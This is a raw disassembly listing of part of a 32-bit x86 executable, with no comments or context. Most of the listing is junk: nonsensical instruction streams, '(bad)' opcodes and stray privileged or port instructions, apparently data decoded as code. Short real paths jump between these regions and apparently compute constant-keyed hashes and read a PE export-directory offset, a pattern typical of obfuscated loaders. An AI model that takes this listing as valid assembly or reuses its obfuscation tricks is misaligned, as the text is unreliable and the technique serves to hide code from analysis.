  40a816:	adc    DWORD PTR [ebx+ebx*2-0x47],eax
  40a81a:	mov    eax,0x303e2e9c
  40a81f:	sbb    al,0x4
  40a821:	sub    esi,DWORD PTR [esi-0x2fe3d514]
  40a827:	frstor [esi]
  40a829:	mov    eax,0x67c6d01
  40a82e:	push   eax
  40a82f:	retf   
  40a830:	div    BYTE PTR [edx+ebp*2+0x2f]
  40a834:	mov    ecx,0xd599983
  40a839:	cli    
  40a83a:	mov    al,0xa9
  40a83c:	jnp    0x40a880
  40a83e:	or     ebp,eax
  40a840:	adc    al,0xd
  40a842:	fcmovnb st,st(4)
  40a844:	push   ebp
  40a845:	mov    bl,0xbf
  40a847:	mov    al,ds:0xb9cd3abf
  40a84c:	inc    edx
  40a84d:	sti    
  40a84e:	xchg   ax,ax
  40a850:	cwde   
  40a851:	inc    esp
  40a852:	mov    cl,0x25
  40a854:	cmp    DWORD PTR [edx+0xa682274],edi
  40a85a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a85c:	mov    ds:0xcbec3fee,al
  40a861:	mov    DWORD PTR [eax+edi*4],ebx
  40a864:	outs   dx,BYTE PTR ds:[esi]
  40a865:	out    0x58,al
  40a867:	pop    ss
  40a868:	mov    ecx,0xb4e33fbc
  40a86d:	je     0x40a80a
  40a86f:	mov    esi,0xd645034b
  40a874:	jmp    0x2e7:0xfb850563
  40a87b:	enter  0x7f4,0xe
  40a87f:	daa    
  40a880:	lds    ebp,FWORD PTR [ecx-0x2e]
  40a883:	dec    edx
  40a884:	test   BYTE PTR [ebx],bh
  40a886:	and    dl,BYTE PTR ds:0xf0807faa
  40a88c:	dec    ebp
  40a88d:	out    dx,al
  40a88e:	js     0x40a902
  40a890:	ins    BYTE PTR es:[edi],dx
  40a891:	daa    
  40a892:	xlat   BYTE PTR ds:[ebx]
  40a893:	das    
  40a894:	ss int 0xdf
  40a897:	inc    edi
  40a898:	xchg   ecx,eax
  40a899:	mov    dh,0x43
  40a89b:	(bad)  [edx-0x2a0ed0dd]
  40a8a1:	mov    al,0x24
  40a8a3:	add    esp,DWORD PTR [ebx+0x63]
  40a8a6:	and    BYTE PTR [esi],ch
  40a8a8:	sub    al,BYTE PTR [ebx+edx*1]
  40a8ab:	outs   dx,DWORD PTR ds:[esi]
  40a8ac:	and    al,0x11
  40a8ae:	out    dx,al
  40a8af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8b0:	jle    0x40a8f2
  40a8b2:	and    BYTE PTR [edi],cl
  40a8b4:	cli    
  40a8b5:	pop    edx
  40a8b6:	push   ebp
  40a8b7:	sub    al,0xdd
  40a8b9:	add    al,0xfe
  40a8bb:	out    dx,eax
  40a8bc:	je     0x40a8e0
  40a8be:	fiadd  WORD PTR [ebx+ebp*4]
  40a8c1:	or     dh,dl
  40a8c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8c4:	in     eax,0x93
  40a8c6:	js     0x40a85d
  40a8c8:	iret   
  40a8c9:	dec    edx
  40a8ca:	dec    ebx
  40a8cb:	cmp    al,0x1d
  40a8cd:	xchg   DWORD PTR [esi+0x43],esp
  40a8d0:	outs   dx,DWORD PTR ds:[esi]
  40a8d1:	pop    ebx
  40a8d2:	sti    
  40a8d3:	sahf   
  40a8d4:	popf   
  40a8d5:	and    esi,DWORD PTR [edi]
  40a8d7:	xchg   ecx,eax
  40a8d8:	faddp  st(7),st
  40a8da:	jmp    0x40a951
  40a8dc:	jne    0x40a92f
  40a8de:	inc    edi
  40a8df:	clc    
  40a8e0:	mov    dl,0xc4
  40a8e2:	test   al,0x7f
  40a8e4:	loop   0x40a86b
  40a8e6:	pop    eax
  40a8e7:	icebp  
  40a8e8:	call   0x2817:0xb64af50e
  40a8ef:	mov    ds:0xa273cf4f,al
  40a8f4:	aaa    
  40a8f5:	mov    esi,0xf2ea8539
  40a8fa:	adc    esp,edi
  40a8fc:	adc    DWORD PTR [esp+ebx*8],ebp
  40a8ff:	push   ss
  40a900:	jb     0x40a942
  40a902:	cmc    
  40a903:	cli    
  40a904:	fdivr  st(2),st
  40a906:	mov    ds:0x402493a9,al
  40a90b:	js     0x40a8a3
  40a90d:	jns    0x40a906
  40a90f:	outs   dx,BYTE PTR ds:[esi]
  40a910:	adc    eax,0xc5510d7a
  40a915:	gs sti 
  40a917:	inc    eax
  40a918:	jb     0x40a906
  40a91a:	daa    
  40a91b:	mov    eax,DWORD PTR [ebp-0x4]
  40a91e:	push   esi
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	mov    bl,0x53
  40a9a8:	leave  
  40a9a9:	imul   esp,eax,0xc57e7e3a
  40a9af:	jg     0x40aa2f
  40a9b1:	jle    0x40a992
  40a9b3:	das    
  40a9b4:	mov    esi,0x6624337b
  40a9b9:	(bad)  
  40a9bb:	jecxz  0x40a9d0
  40a9bd:	pop    ss
  40a9be:	ins    BYTE PTR es:[edi],dx
  40a9bf:	mov    edi,ecx
  40a9c1:	adc    DWORD PTR [ecx+ebp*4],ecx
  40a9c4:	jl     0x40a9b1
  40a9c6:	pop    edi
  40a9c7:	jmp    0x18289abc
  40a9cc:	and    eax,0x98156d7b
  40a9d1:	pop    es
  40a9d2:	and    ecx,esp
  40a9d4:	push   ecx
  40a9d5:	mov    al,ds:0x3192dee5
  40a9da:	push   eax
  40a9db:	jmp    0x8d641174
  40a9e0:	fwait
  40a9e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9e2:	pop    ebp
  40a9e3:	bound  ecx,QWORD PTR [ecx+0x29efa34f]
  40a9e9:	test   DWORD PTR [edx+0x5a347c58],0xfa5db0d7
  40a9f3:	cmp    ecx,DWORD PTR [edi]
  40a9f5:	out    0x3a,eax
  40a9f7:	jnp    0x40a9a2
  40a9f9:	test   ch,dh
  40a9fb:	or     esp,DWORD PTR [eax-0x57d5819c]
  40aa01:	icebp  
  40aa02:	pop    es
  40aa03:	in     al,0x2e
  40aa05:	mov    esi,0x1b15f173
  40aa0a:	mov    BYTE PTR [ecx+0x32fe70c9],dl
  40aa10:	int3   
  40aa11:	dec    edi
  40aa12:	ret    0xf6bd
  40aa15:	adc    ebx,edi
  40aa17:	sub    ah,BYTE PTR [ebp+0x51]
  40aa1a:	or     eax,0xd5d92d93
  40aa1f:	mov    edi,DWORD PTR [ebx]
  40aa21:	mov    esi,0x150551f
  40aa26:	loop   0x40aa52
  40aa28:	add    ah,BYTE PTR es:[eax]
  40aa2b:	hlt    
  40aa2c:	pushf  
  40aa2d:	outs   dx,BYTE PTR ds:[esi]
  40aa2e:	sbb    cl,dh
  40aa30:	mov    edx,0x2039f17e
  40aa35:	sar    DWORD PTR [esi+0x228af2d3],1
  40aa3b:	mov    eax,0x25cb1111
  40aa40:	retf   
  40aa41:	jae    0x40a9dc
  40aa43:	stos   BYTE PTR es:[edi],al
  40aa44:	inc    edx
  40aa45:	jecxz  0x40aa33
  40aa47:	cmp    ch,BYTE PTR [ecx+0x27]
  40aa4a:	ins    DWORD PTR es:[edi],dx
  40aa4b:	xor    cl,bl
  40aa4d:	pop    edi
  40aa4e:	push   esi
  40aa4f:	cmp    BYTE PTR [edx+0x75],0x5a
  40aa53:	addr16 enter 0x518e,0xe
  40aa58:	aaa    
  40aa59:	or     ch,al
  40aa5b:	or     DWORD PTR fs:[edx+edi*8+0xa],edi
  40aa60:	push   ebp
  40aa61:	cld    
  40aa62:	xor    BYTE PTR [edx],0xae
  40aa65:	xor    ecx,edi
  40aa67:	in     al,0xec
  40aa69:	clc    
  40aa6a:	fldcw  WORD PTR [edi]
  40aa6c:	dec    esi
  40aa6d:	imul   esi,DWORD PTR [eax],0xdb956ecd
  40aa73:	dec    ebp
  40aa74:	or     edi,0x6fc39055
  40aa7a:	nop
  40aa7b:	out    0x19,al
  40aa7d:	jbe    0x40aad0
  40aa7f:	pop    edi
  40aa80:	cmp    esi,DWORD PTR [esp+ebp*1]
  40aa83:	sub    DWORD PTR [esi+0x3a],ecx
  40aa86:	xchg   edx,eax
  40aa87:	push   cs
  40aa88:	pop    ecx
  40aa89:	comiss xmm5,DWORD PTR [esi-0x3]
  40aa8d:	out    0xec,al
  40aa8f:	in     al,0xf7
  40aa91:	pop    ebx
  40aa92:	jbe    0x40ab0c
  40aa94:	js     0x40aafc
  40aa96:	xor    al,BYTE PTR [eax-0x599b4643]
  40aa9c:	jmp    0xda706dc7
  40aaa1:	mov    dh,0x99
  40aaa3:	sar    BYTE PTR [esi],cl
  40aaa5:	test   DWORD PTR [ebx],ebp
  40aaa7:	jne    0x40aa74
  40aaa9:	pop    ss
  40aaaa:	jbe    0x40ab0a
  40aaac:	int3   
  40aaad:	test   esi,ebp
  40aaaf:	push   ds
  40aab0:	ss nop
  40aab2:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40aab4:	ret    
  40aab5:	xor    DWORD PTR [ebx],ebx
  40aab7:	wrmsr  
  40aab9:	inc    ebp
  40aaba:	(bad)  
  40aabb:	out    dx,eax
  40aabc:	mov    ebp,ebp
  40aabe:	inc    ebx
  40aabf:	stos   BYTE PTR es:[edi],al
  40aac0:	or     DWORD PTR [edi],0x6a
  40aac3:	mov    ds,ecx
  40aac5:	jle    0x40aaf4
  40aac7:	(bad)  [edi+edx*2+0x39]
  40aacb:	sbb    BYTE PTR [edx+0x69c4350b],dh
  40aad1:	sub    eax,0xf60a6e66
  40aad6:	mov    esi,0xa63cd759
  40aadb:	dec    esi
  40aadc:	pop    ds
  40aadd:	mov    ds:0xb3285f9a,al
  40aae2:	inc    ebp
  40aae3:	loope  0x40ab5c
  40aae5:	(bad)  
  40aae6:	cmp    al,0xf9
  40aae8:	in     al,0x8c
  40aaea:	pushf  
  40aaeb:	ds cmovb ebp,edx
  40aaef:	or     DWORD PTR [ebp-0x5c4272f6],edi
  40aaf5:	push   cs
  40aaf6:	pop    esp
  40aaf7:	into   
  40aaf8:	dec    ebp
  40aaf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aafa:	out    dx,eax
  40aafb:	scas   eax,DWORD PTR es:[edi]
  40aafc:	mov    edi,0xcfae69b1
  40ab01:	add    eax,0xe4fa33a0
  40ab06:	mov    fs:0xffa62f86,al
  40ab0c:	dec    ebx
  40ab0d:	xor    eax,edx
  40ab0f:	xor    esi,edx
  40ab11:	add    eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0x5eddac8b
  40ab26:	call   0x7e7bfadb
  40ab2b:	jle    0x40aaf2
  40ab2d:	jg     0x40abad
  40ab2f:	jle    0x40ab55
  40ab31:	ret    0x5a4e
  40ab34:	xchg   esi,eax
  40ab35:	stos   DWORD PTR es:[edi],eax
  40ab36:	ds sbb al,0xcf
  40ab39:	or     bh,cl
  40ab3b:	dec    esi
  40ab3c:	arpl   WORD PTR [esi+0x36],sp
  40ab3f:	xchg   edx,eax
  40ab40:	iret   
  40ab41:	in     eax,dx
  40ab42:	fbstp  TBYTE PTR [ecx]
  40ab44:	lea    esp,[ecx+0x26]
  40ab47:	adc    eax,0xa02d0ec5
  40ab4c:	sub    eax,0xdf6078e6
  40ab51:	cmp    eax,0x90372694
  40ab56:	jmp    0x40ab06
  40ab58:	jnp    0x40abc8
  40ab5a:	push   edx
  40ab5b:	(bad)  
  40ab5c:	hlt    
  40ab5d:	iret   
  40ab5e:	push   ecx
  40ab5f:	xchg   ebp,eax
  40ab60:	fldenv [ebp+0xdbbf40f]
  40ab66:	and    BYTE PTR [ebx],dh
  40ab68:	test   cl,dl
  40ab6a:	loope  0x40ab55
  40ab6c:	cmp    BYTE PTR [ebx+0x16],ah
  40ab6f:	in     al,dx
  40ab70:	and    ah,BYTE PTR [ecx-0x6ed4b325]
  40ab76:	lock (bad) 
  40ab78:	jmp    0x60636989
  40ab7d:	es fwait
  40ab7f:	jne    0x40ab8f
  40ab81:	jnp    0x40ab9e
  40ab83:	dec    esi
  40ab84:	cld    
  40ab85:	xor    cl,BYTE PTR [edi-0x3e]
  40ab88:	push   eax
  40ab89:	mov    dh,0x25
  40ab8b:	dec    ebp
  40ab8c:	shl    ecx,cl
  40ab8e:	test   BYTE PTR [eax+ecx*1+0x71],dl
  40ab92:	and    DWORD PTR [ebx-0x1c],ecx
  40ab95:	repz dec ecx
  40ab97:	repnz bound esp,QWORD PTR [edi-0x3c61e6e3]
  40ab9e:	cld    
  40ab9f:	mov    edx,0xa010375e
  40aba4:	cwde   
  40aba5:	bound  ebx,QWORD PTR [ebx-0x64fc4f8e]
  40abab:	push   0x425788e
  40abb0:	jb     0x40abf2
  40abb2:	adc    DWORD PTR [ebx+edi*1-0x1b],edi
  40abb6:	pop    ecx
  40abb7:	mov    BYTE PTR [edi+0x624925ac],cl
  40abbd:	mov    ah,0xce
  40abbf:	sub    DWORD PTR [ecx-0x51c1b2b6],edx
  40abc5:	jbe    0x40ab7f
  40abc7:	push   es
  40abc8:	pusha  
  40abc9:	inc    eax
  40abca:	xor    BYTE PTR [edx],al
  40abcc:	rol    esi,0x93
  40abcf:	idiv   DWORD PTR [ebx-0x2]
  40abd2:	inc    ecx
  40abd3:	sbb    eax,0xc92749ca
  40abd8:	jecxz  0x40abcc
  40abda:	aaa    
  40abdb:	push   cs
  40abdc:	test   DWORD PTR ds:0x90c4a52,ecx
  40abe2:	pop    esp
  40abe3:	(bad)  
  40abe5:	scas   eax,DWORD PTR es:[edi]
  40abe6:	(bad)  
  40abe7:	xchg   edx,eax
  40abe8:	imul   esi,DWORD PTR [ebp+esi*4-0x3e],0x50
  40abed:	ins    DWORD PTR es:[edi],dx
  40abee:	jo     0x40ac26
  40abf0:	lock int 0xc7
  40abf3:	push   0xffffff88
  40abf5:	inc    ebp
  40abf6:	rcr    BYTE PTR [edx-0x4516447d],1
  40abfc:	cmp    eax,DWORD PTR [edx]
  40abfe:	pusha  
  40abff:	popa   
  40ac00:	and    al,0x7a
  40ac02:	clc    
  40ac03:	bound  ebp,QWORD PTR [edi-0x5f410a38]
  40ac09:	mov    ah,0x92
  40ac0b:	mov    bh,0x1e
  40ac0d:	push   ebp
  40ac0e:	loope  0x40aba8
  40ac10:	sub    al,0xee
  40ac12:	hlt    
  40ac13:	(bad)  
  40ac14:	es push esp
  40ac16:	repnz std 
  40ac18:	es dec esi
  40ac1a:	mov    bl,0x84
  40ac1c:	inc    esi
  40ac1d:	jmp    0x40ac86
  40ac1f:	mov    bl,0xb9
  40ac21:	shl    edx,1
  40ac23:	inc    ecx
  40ac24:	das    
  40ac25:	push   ebx
  40ac26:	clc    
  40ac27:	or     esp,esp
  40ac29:	jns    0x40abc2
  40ac2b:	jns    0x40ac16
  40ac2d:	cmp    BYTE PTR [eax],dh
  40ac2f:	and    BYTE PTR [edx-0x27453083],bh
  40ac35:	mov    ds:0x8a8dca93,al
  40ac3a:	imul   esp,DWORD PTR [ebx+eiz*4],0xffffffe4
  40ac3e:	leave  
  40ac3f:	cmp    dl,BYTE PTR [edx+eax*1]
  40ac42:	adc    bl,al
  40ac44:	cld    
  40ac45:	lods   eax,DWORD PTR ds:[esi]
  40ac46:	std    
  40ac47:	sub    BYTE PTR [ecx-0x1f],dh
  40ac4a:	or     bh,0xe6
  40ac4d:	inc    edi
  40ac4e:	sub    esp,DWORD PTR [ebp-0x7d]
  40ac51:	xchg   esi,eax
  40ac52:	test   al,0xcb
  40ac54:	out    0x63,eax
  40ac56:	xor    al,0xb7
  40ac58:	xor    dl,dl
  40ac5a:	sbb    BYTE PTR [edi],0x7a
  40ac5d:	jl     0x40ac2c
  40ac5f:	adc    eax,0x77baca4c
  40ac64:	aad    0xd0
  40ac66:	gs lahf 
  40ac68:	adc    ch,BYTE PTR [ecx]
  40ac6a:	cmp    ah,0xf0
  40ac6d:	sbb    al,0xb6
  40ac6f:	push   edi
  40ac70:	sub    al,0xb7
  40ac72:	xchg   DWORD PTR [edi],ebp
  40ac74:	or     dh,BYTE PTR [eax]
  40ac76:	and    eax,0xd4b97860
  40ac7b:	jg     0x40ace2
  40ac7d:	gs mov dl,0xe1
  40ac80:	mov    cl,0x41
  40ac82:	mov    BYTE PTR ds:0x8f09ee3c,bl
  40ac88:	cli    
  40ac89:	adc    edi,DWORD PTR [ebx-0x50f00efd]
  40ac8f:	(bad)  
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    edx,DWORD PTR [eiz*4+0x392a8b79]
  40acc1:	jle    0x40ad41
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40acdb
  40acc8:	pop    esi
  40acc9:	xor    cl,dh
  40accb:	test   eax,0x901b880f
  40acd0:	jmp    0x40ac52
  40acd2:	(bad)  
  40acd3:	(bad)  
  40acd4:	inc    BYTE PTR [ecx+edi*4-0x1e]
  40acd8:	mov    edx,0xaad23409
  40acdd:	cmovg  esi,DWORD PTR [ecx+0x3dab6af4]
  40ace4:	ja     0x40acb1
  40ace6:	or     eax,0x36a52718
  40aceb:	das    
  40acec:	jns    0x40acc4
  40acee:	jno    0x40ace1
  40acf0:	mov    ch,0xfd
  40acf2:	mov    eax,0x4eb8f135
  40acf7:	out    0xc5,al
  40acf9:	int    0xec
  40acfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acfc:	pop    ebx
  40acfd:	test   eax,0xb8210a96
  40ad02:	shr    BYTE PTR [ebp-0x44],cl
  40ad05:	pop    edx
  40ad06:	(bad)  
  40ad07:	push   ebx
  40ad08:	pop    ebp
  40ad09:	mov    eax,ds:0xd109c918
  40ad0e:	pushf  
  40ad0f:	in     eax,dx
  40ad10:	push   eax
  40ad11:	mov    ebx,0x85df96bc
  40ad16:	fnstenv [ecx+0x230cdf3e]
  40ad1c:	or     esp,DWORD PTR [eax]
  40ad1e:	aaa    
  40ad1f:	inc    esi
  40ad20:	stos   DWORD PTR es:[edi],eax
  40ad21:	xor    al,0x19
  40ad23:	mov    ds:0x57d3615c,eax
  40ad28:	jo     0x40ad04
  40ad2a:	cmp    bh,BYTE PTR [ebp-0x28]
  40ad2d:	and    ch,BYTE PTR [esp+ecx*2]
  40ad30:	ds jae 0x40ad2d
  40ad33:	scas   eax,DWORD PTR es:[edi]
  40ad34:	sub    al,0x69
  40ad36:	or     al,0xe9
  40ad38:	fnstenv [ebp-0x50]
  40ad3b:	test   al,0xa0
  40ad3d:	js     0x40ace2
  40ad3f:	xchg   edi,eax
  40ad40:	add    BYTE PTR [eax-0x57],0x6c
  40ad44:	add    esi,DWORD PTR [esi+0x22]
  40ad47:	and    eax,0x76f343d3
  40ad4c:	add    ebp,DWORD PTR [esi+0x438fd2df]
  40ad52:	dec    esp
  40ad53:	pop    edi
  40ad54:	adc    BYTE PTR [ecx-0x2f],bh
  40ad57:	and    eax,ebx
  40ad59:	test   DWORD PTR [ebp+0x34],eax
  40ad5c:	scas   eax,DWORD PTR es:[edi]
  40ad5d:	mov    dl,0x9b
  40ad5f:	and    DWORD PTR [ebp-0x2d8b6cef],ebp
  40ad65:	mov    esp,0x6d77a6a7
  40ad6a:	cli    
  40ad6b:	pop    eax
  40ad6c:	adc    al,0x35
  40ad6e:	xchg   esi,eax
  40ad6f:	imul   BYTE PTR [edi]
  40ad71:	xchg   DWORD PTR [edi],esi
  40ad73:	aaa    
  40ad74:	enter  0x92e1,0xed
  40ad78:	jbe    0x40ad76
  40ad7a:	cmp    al,0x9e
  40ad7c:	xchg   esi,eax
  40ad7d:	jle    0x40ad15
  40ad7f:	pop    edi
  40ad80:	(bad)  
  40ad81:	adc    DWORD PTR [ebx+0x7d],edi
  40ad84:	aas    
  40ad85:	sub    eax,0x4da73ab6
  40ad8a:	sub    BYTE PTR [edi+0x79],cl
  40ad8d:	push   ebp
  40ad8e:	cld    
  40ad8f:	data16 jecxz 0x40adca
  40ad92:	mov    ebx,0x52b1272f
  40ad97:	dec    ebx
  40ad98:	sti    
  40ad99:	cmc    
  40ad9a:	ss mov ebx,0xfee42271
  40ada0:	mov    ch,cl
  40ada2:	push   ebp
  40ada3:	jecxz  0x40ad8e
  40ada5:	in     al,dx
  40ada6:	xchg   ebx,eax
  40ada7:	lea    edi,[ebp+0x53]
  40adaa:	and    BYTE PTR [ebx-0x54],al
  40adad:	push   ss
  40adae:	stos   BYTE PTR es:[edi],al
  40adaf:	xchg   esi,eax
  40adb0:	outs   dx,DWORD PTR ds:[esi]
  40adb1:	stos   DWORD PTR es:[edi],eax
  40adb2:	outs   dx,BYTE PTR ds:[esi]
  40adb3:	sar    BYTE PTR [esi+0x1adef0ab],1
  40adb9:	int3   
  40adba:	add    eax,DWORD PTR [esi]
  40adbc:	jmp    0x9efb7ef9
  40adc1:	fisttp WORD PTR [esi-0x2fdefe7c]
  40adc7:	mov    ecx,0x367a5950
  40adcc:	xchg   esi,eax
  40adcd:	leave  
  40adce:	stos   DWORD PTR es:[edi],eax
  40adcf:	iret   
  40add0:	or     DWORD PTR [eax+0x5e],eax
  40add3:	sbb    eax,0xd52c9385
  40add8:	call   0x61aeff0b
  40addd:	outs   dx,BYTE PTR ds:[esi]
  40adde:	cwde   
  40addf:	mov    al,ds:0x63ce4a70
  40ade4:	mov    cs,WORD PTR [esi+edi*1-0x1f8d4271]
  40adeb:	leave  
  40adec:	mov    ebx,0x5d744418
  40adf1:	sub    al,0xcb
  40adf3:	jb     0x40ae22
  40adf5:	sub    ebp,ebx
  40adf7:	jp     0x40ae4d
  40adf9:	adc    bl,ch
  40adfb:	push   ds
  40adfc:	jb     0x40ae2e
  40adfe:	mov    al,0x56
  40ae00:	mov    ds:0xb294831e,eax
  40ae05:	bound  esi,QWORD PTR [ecx-0x3e7aaa6d]
  40ae0b:	xor    cl,bl
  40ae0d:	or     BYTE PTR [esi+ebx*1],0x37
  40ae11:	xchg   BYTE PTR [edi-0x14],dl
  40ae14:	popf   
  40ae15:	xchg   edi,eax
  40ae16:	and    DWORD PTR [esi-0x24],eax
  40ae19:	mov    al,ds:0x526d4683
  40ae1e:	mov    eax,ds:0x38ea806
  40ae23:	icebp  
  40ae24:	imul   eax,esi
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0xd2268d5d
  40ae94:	pop    esi
  40ae95:	mov    WORD PTR [ebx],fs
  40ae97:	icebp  
  40ae98:	ds jle 0x40af19
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	ror    BYTE PTR ds:0x94764eec,1
  40aea5:	stc    
  40aea6:	cmc    
  40aea7:	ins    DWORD PTR es:[edi],dx
  40aea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aea9:	retf   0x9218
  40aeac:	pop    esp
  40aead:	or     BYTE PTR [edx],0x24
  40aeb0:	pushf  
  40aeb1:	lahf   
  40aeb2:	push   esi
  40aeb3:	enter  0x616f,0x18
  40aeb7:	(bad)  
  40aeb9:	retf   
  40aeba:	adc    al,0xc3
  40aebc:	jb     0x40aeb3
  40aebe:	xchg   esp,eax
  40aebf:	fs push edx
  40aec1:	mov    al,0xd2
  40aec3:	ins    DWORD PTR es:[edi],dx
  40aec4:	mov    esi,0xf51ae963
  40aec9:	mov    bl,0x77
  40aecb:	pop    ds
  40aecc:	adc    BYTE PTR [eax-0x14e66ca7],cl
  40aed2:	sub    BYTE PTR [eax+ebp*8],dl
  40aed5:	ins    DWORD PTR es:[edi],dx
  40aed6:	shr    BYTE PTR [ecx+eiz*1],cl
  40aed9:	jmp    0x4b032e8d
  40aede:	ret    
  40aedf:	hlt    
  40aee0:	cmp    BYTE PTR [edi+eax*2],dl
  40aee3:	pop    esi
  40aee5:	adc    BYTE PTR [edi],dh
  40aee7:	mov    dh,0xd1
  40aee9:	jg     0x40af46
  40aeeb:	jg     0x40aeaf
  40aeed:	out    0x50,al
  40aeef:	inc    eax
  40aef0:	xor    ecx,DWORD PTR [edx]
  40aef2:	cmp    cl,BYTE PTR [edx]
  40aef4:	pop    ebp
  40aef5:	pop    ebx
  40aef6:	mov    eax,ds:0xde3c397f
  40aefb:	xchg   esp,eax
  40aefc:	cmp    ch,cl
  40aefe:	aam    0xf7
  40af00:	das    
  40af01:	inc    esi
  40af02:	stc    
  40af03:	mov    cl,0xeb
  40af05:	push   edx
  40af06:	out    dx,eax
  40af07:	adc    al,0xb1
  40af09:	sbb    al,0x1e
  40af0b:	fcomp  st(0)
  40af0d:	test   bh,0x21
  40af10:	mov    eax,0xb2dbf5b2
  40af15:	das    
  40af16:	int    0xc4
  40af18:	stc    
  40af19:	add    DWORD PTR [edx],esi
  40af1b:	aam    0x99
  40af1d:	ss bswap ecx
  40af20:	jge    0x40af98
  40af22:	push   edi
  40af23:	int    0x1e
  40af25:	rcl    DWORD PTR [ecx+0x6d076ed3],1
  40af2b:	sbb    eax,0x94cadfcd
  40af30:	push   esp
  40af31:	mov    esi,0x956b0b60
  40af36:	stos   DWORD PTR es:[edi],eax
  40af37:	aam    0x37
  40af39:	xor    BYTE PTR [edx],bl
  40af3b:	popa   
  40af3c:	popf   
  40af3d:	xlat   BYTE PTR ds:[ebx]
  40af3e:	int    0x2c
  40af40:	mov    ds:0x633e700d,eax
  40af45:	cmp    al,0x13
  40af47:	sar    DWORD PTR [esi+0x1f0ea724],cl
  40af4d:	ror    BYTE PTR [ecx-0x7f8236f7],cl
  40af53:	jae    0x40afac
  40af55:	jae    0x40afa9
  40af57:	call   0x6f96d4aa
  40af5c:	jne    0x40afb3
  40af5e:	xchg   edx,eax
  40af5f:	ja     0x40afdd
  40af61:	mov    edx,DWORD PTR [ebx+0x375fa995]
  40af67:	mov    ebx,0x32729f
  40af6c:	add    ecx,ebx
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417e3d
  40afb5:	and    DWORD PTR ds:0x417e41,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412374,ecx
  40afc4:	mov    ecx,0x4573
